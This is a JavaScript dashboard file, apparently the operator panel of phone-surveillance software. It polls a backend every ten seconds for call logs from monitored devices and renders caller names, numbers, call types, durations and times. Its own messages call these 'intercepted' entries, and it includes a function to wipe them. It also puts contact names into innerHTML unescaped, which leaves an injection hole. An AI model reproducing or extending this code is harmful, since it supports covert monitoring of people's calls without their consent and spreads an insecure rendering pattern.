class CallsEngine {
    constructor() {
        this.activeDeviceId = localStorage.getItem('active_device_id');
        this.init();
    }

    async init() {
        await this.loadDevicesList();
        if (!this.activeDeviceId) return;
        this.fetchCalls();
        // Har 10s me database synchronization state updates legi
        setInterval(() => this.fetchCalls(), 10000);
    }

    async loadDevicesList() {
        const token = localStorage.getItem('owner_token');
        try {
            const res = await fetch('/api/devices', { headers: { 'Authorization': `Bearer ${token}` } });
            const result = await res.json();
            if (result.status === 'success') {
                const selectEl = document.getElementById('device-select');
                if (selectEl) {
                    selectEl.innerHTML = '';
                    if (result.data.length === 0) {
                        selectEl.innerHTML = '<option value="">No Devices Found</option>';
                        return;
                    }
                    result.data.forEach(dev => {
                        const option = document.createElement('option');
                        option.value = dev.id;
                        option.textContent = dev.name;
                        selectEl.appendChild(option);
                    });

                    // 🚀 FIX: LocalStorage assignment check validation sequence fixed
                    if (!this.activeDeviceId && result.data.length > 0) {
                        this.activeDeviceId = result.data[0].id;
                        localStorage.setItem('active_device_id', this.activeDeviceId);
                    }
                    selectEl.value = this.activeDeviceId;

                    selectEl.addEventListener('change', (e) => {
                        this.activeDeviceId = e.target.value;
                        localStorage.setItem('active_device_id', this.activeDeviceId);
                        this.fetchCalls();
                    });
                }
            }
        } catch (e) { console.error("Device drop parsing failed:", e); }
    }

    async fetchCalls() {
        const token = localStorage.getItem('owner_token');
        try {
            const res = await fetch(`/api/calls?device_id=${this.activeDeviceId}&limit=150`, {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            const result = await res.json();
            this.renderCalls(result.data || []);
        } catch (e) { console.error("Call sync fetch context error:", e); }
    }

    renderCalls(data) {
        const container = document.getElementById('calls-list');
        if (!container) return;

        if (data.length === 0) {
            container.innerHTML = '<div style="color: #888; text-align: center; padding: 20px;">No telephony entries intercepted yet.</div>';
            return;
        }

        container.innerHTML = data.map(c => {
            // Identity extraction configuration
            let displayName = c.phone_number;
            if (c.contact_name && c.contact_name !== 'Unknown') {
                displayName = `${c.contact_name} <span style="font-size: 0.85rem; color: #888; font-family: monospace;">(${c.phone_number})</span>`;
            }

            // 🚀 UPGRADE: Android code types and strings conditional routing
            let callType = String(c.type).toLowerCase();
            let label = 'UNKNOWN';
            let color = '#95a5a6';

            if (callType === '1' || callType.includes('incoming')) {
                label = 'INCOMING'; color = '#2ecc71';
            } else if (callType === '2' || callType.includes('outgoing')) {
                label = 'OUTGOING'; color = '#3498db';
            } else if (callType === '3' || callType.includes('missed')) {
                label = 'MISSED'; color = '#e74c3c';
            }

            // 🚀 UPGRADE: Raw seconds data conversion pipeline
            let durationText = '0s';
            if (c.duration > 0) {
                const mins = Math.floor(c.duration / 60);
                const secs = c.duration % 60;
                durationText = mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;
            }

            // Date structure formats
            const dateObj = new Date(c.timestamp);
            const dateString = dateObj.toLocaleDateString('en-IN', { day: '2-digit', month: 'short' });
            const timeString = dateObj.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit' });

            return `
            <div class="call-card" style="border-left: 4px solid ${color};">
                <div style="display: flex; justify-content: space-between; align-items: center;">
                    <span style="color: white; font-weight: 600; font-size: 1.05rem;">${displayName}</span>
                    <span class="badge-call" style="background: ${color}22; color: ${color}; border: 1px solid ${color};">${label}</span>
                </div>
                <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 4px; font-size: 0.85rem;">
                    <span style="color: #aaa;">Duration: <strong style="color: #fff;">${durationText}</strong></span>
                    <span style="color: #666; font-family: monospace; font-weight: bold;">${dateString} &bull; ${timeString}</span>
                </div>
            </div>
            `;
        }).join('');
    }
}

window.wipeCallsHistory = async function() {
    if(!confirm("CRITICAL PROTOCOL: Are you sure you want to permanently delete all intercepted call entries?")) return;
    const token = localStorage.getItem('owner_token');
    const deviceId = localStorage.getItem('active_device_id');
    try {
        const res = await fetch('/api/calls/clear', {
            method: 'POST',
            headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ device_id: deviceId })
        });
        const result = await res.json();
        if(result.status === 'success') {
            alert("Database call logs wiped cleanly.");
            window.location.reload();
        }
    } catch(e) { console.error("Wipe command network failure:", e); }
};

document.addEventListener('DOMContentLoaded', () => new CallsEngine());
